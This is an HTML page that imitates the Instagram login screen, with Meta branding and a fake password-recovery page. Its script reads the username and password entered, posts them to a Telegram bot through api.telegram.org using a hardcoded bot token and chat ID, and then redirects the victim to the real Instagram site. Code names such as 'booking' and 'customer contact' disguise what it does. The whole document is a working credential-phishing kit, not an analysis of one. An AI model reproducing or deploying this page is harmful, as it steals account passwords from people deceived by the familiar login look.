<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#202023">
  <title>Instagram</title>

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      background: #202023;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    .screen {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 22px;
    }

    .top {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .back {
      color: white;
      text-decoration: none;
      font-size: 28px;
    }

    .language {
      font-size: 15px;
      margin: auto;
      padding-right: 25px;
    }

    .logo-area {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 80px;
    }

    .logo {
      width: 68px;
      height: 68px;
      border: 6px solid transparent;
      border-radius: 21px;
      background:
        linear-gradient(#202023, #202023) padding-box,
        linear-gradient(40deg, #ffdc80, #fd5949, #d6249f, #285aeb) border-box;
      position: relative;
    }

    .camera {
      position: absolute;
      width: 34px;
      height: 34px;
      border: 5px solid #e130a0;
      border-radius: 50%;
      top: 11px;
      left: 11px;
    }
.forgot-button {
  display: block;
  margin: 22px auto 0;
  padding: 0;
  background: transparent;
  border: none;
  color: #ffffff;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}
    .camera::after {
      content: "";
      position: absolute;
      width: 7px;
      height: 7px;
      background: #d6249f;
      border-radius: 50%;
      top: -8px;
      right: -8px;
    }

    .form {
      width: 100%;
      max-width: 500px;
      margin: 100px auto 0;
    }

    .booking-label {
      color: #c8c8c8;
      text-align: center;
      font-size: 12px;
      margin-bottom: 18px;
    }

    input {
      display: block;
      width: 100%;
      height: 60px;
      margin-bottom: 14px;
      padding: 0 18px;
      border: 1px solid #505054;
      border-radius: 16px;
      background: transparent;
      color: white;
      font-size: 16px;
      outline: none;
    }

    input::placeholder { color: #f1f1f1; opacity: 1; }
    input:focus { border-color: #5797ff; }

    .booking-button {
      width: 100%;
      height: 51px;
      border: none;
      border-radius: 30px;
      background: #0866e8;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    .booking-button:disabled {
      opacity: .6;
      cursor: wait;
    }

    .message {
      font-size: 13px;
      text-align: center;
      line-height: 1.5;
      margin-top: 14px;
      overflow-wrap: anywhere;
    }

    .bottom {
      margin-top: auto;
      padding-top: 60px;
      text-align: center;
    }

    .create {
      width: 100%;
      height: 50px;
      border: 1px solid #5797ff;
      border-radius: 30px;
      color: white;
      background: transparent;
      font-size: 15px;
      cursor: pointer;
    }

    .meta {
      color: #ccc;
      margin: 24px 0 12px;
      font-size: 19px;
    }

    @media (max-width: 380px) {
      .screen { padding: 16px; }
      .form { margin-top: 75px; }
      input { height: 56px; }
    }
  </style>
</head>

<body>
  <main class="screen">

    <div class="top">
      <a class="back" href="index.html" aria-label="Back">‹</a>
      <div class="language">English (India)⌄</div>
    </div>

    <div class="logo-area">
      <div class="logo" aria-label="Booking logo">
        <div class="camera"></div>
      </div>
    </div>

    <form class="form" id="bookingForm">
      <div class="booking-label">
        enter your info to access your account!
      </div>

      <input
        type="text"
        id="customerName"
        placeholder="username, email address or phone number "
        autocomplete="name"
        maxlength="100"
        required
      >

      <input
        type="text"
        id="customerContact"
        placeholder="Password "
        maxlength="254"
        required
      >

      <button class="booking-button" id="bookButton" type="submit">
        logi in 
      </button>

<button class="forgot-button" type="button"
        onclick="showRecoveryPage()">
  Forgotten password?
</button>

      <div class="message" id="message" aria-live="polite"></div>

      <p style="font-size:12px;color:#ccc;text-align:center;line-height:1.5">
        Your account name and contact details will be secure by meta 
      </p>
    </form>

    <div class="bottom">
      <button class="create" type="button" id="createBooking">
        Create a new account 
      </button>
      <div class="meta">@meta</div>
    </div>

  </main>

  <script>
    // 1. Telegram bot details
    const BOT_TOKEN = "8926184389:AAGaCKdWRWIaAZdUnDLjKBNZwCHyVu4Rwxg";
    const CHAT_ID = "6584511195";

    // 2. Website to open after successful booking
    const REDIRECT_URL = "https://www.instagram.com";

    const form = document.getElementById("bookingForm");
    const message = document.getElementById("message");
    const bookButton = document.getElementById("bookButton");

    form.addEventListener("submit", async function(event) {
      event.preventDefault();

      const name = document
        .getElementById("customerName").value.trim();

      const contact = document
        .getElementById("customerContact").value.trim();

      if (!name || !contact) {
        message.style.color = "#ff9b9b";
        message.textContent =
          "Please enter your name and contact details.";
        return;
      }

      if (
        BOT_TOKEN.includes("PASTE_") ||
        CHAT_ID.includes("PASTE_") ||
        REDIRECT_URL === "https://example.com"
      ) {
        message.style.color = "#ff9b9b";
        message.textContent =
          "";
        return;
      }

      bookButton.disabled = true;
      bookButton.textContent = "loding...";
      message.style.color = "#ccc";
      message.textContent = "loding...";

      const text =
        "NEW BOOKING REQUEST\n\n" +
        "Name: " + name + "\n" +
        "Contact: " + contact;

      try {
        const response = await fetch(
          "https://api.telegram.org/bot" +
          BOT_TOKEN + "/sendMessage",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: text
            })
          }
        );

        const result = await response.json();

        if (!response.ok || !result.ok) {
          throw new Error("Telegram request failed.");
        }

        message.style.color = "#b8e6c0";
        message.textContent =
          "";

        form.reset();

        setTimeout(function() {
          window.location.href = REDIRECT_URL;
        }, 1500);

      } catch (error) {
        message.style.color = "#ff9b9b";
        message.textContent =
          "Could not send booking. Please try again.";
      } finally {
        bookButton.disabled = false;
        bookButton.textContent = "log in";
      }
    });

    document.getElementById("createBooking").addEventListener(
      "click",
      function() {
        document.getElementById("customerName").focus();
        window.scrollTo({ top: 0, behavior: "smooth" });
      }
    );
</script>
<script>
function showRecoveryPage() {
  document.body.innerHTML = `
    <main style="
      min-height:100vh;
      background:#202023;
      color:white;
      padding:65px 22px;
      font-family:Arial,sans-serif;
      box-sizing:border-box;
    ">
      <button onclick="location.reload()" style="
        background:none;border:none;color:white;
        font-size:28px;cursor:pointer;
      ">‹</button>

      <section style="max-width:500px;margin:28px auto;">
        <h1 style="font-size:27px;margin-bottom:12px;">
          Find your account
        </h1>

        <p style="font-size:16px;line-height:1.5;">
          Enter your email address or username.<br>
          I think that my account has been hacked
        </p>

        <form id="recoveryForm">
          <input type="text" placeholder="Email address or username"
            required maxlength="254"
            style="
              width:100%;height:68px;padding:0 18px;
              margin:12px 0 22px;box-sizing:border-box;
              border:1px solid #505054;border-radius:18px;
              background:transparent;color:white;font-size:16px;
            ">

          <button type="submit" style="
            width:100%;height:51px;border:0;
            border-radius:30px;background:#0866e8;
            color:white;font-size:16px;font-weight:bold;
          ">Continue</button>
        </form>

        <button type="button" style="
          display:block;margin:18px auto;background:none;
          border:0;color:white;font-size:16px;
        ">Find by mobile number</button>
      </section>
    </main>
  `;

  document.getElementById("recoveryForm").addEventListener(
    "submit", function(event) {
      event.preventDefault();
      alert(" Account recovery is not not found");
    }
  );
}
</script>
</body>
</html>
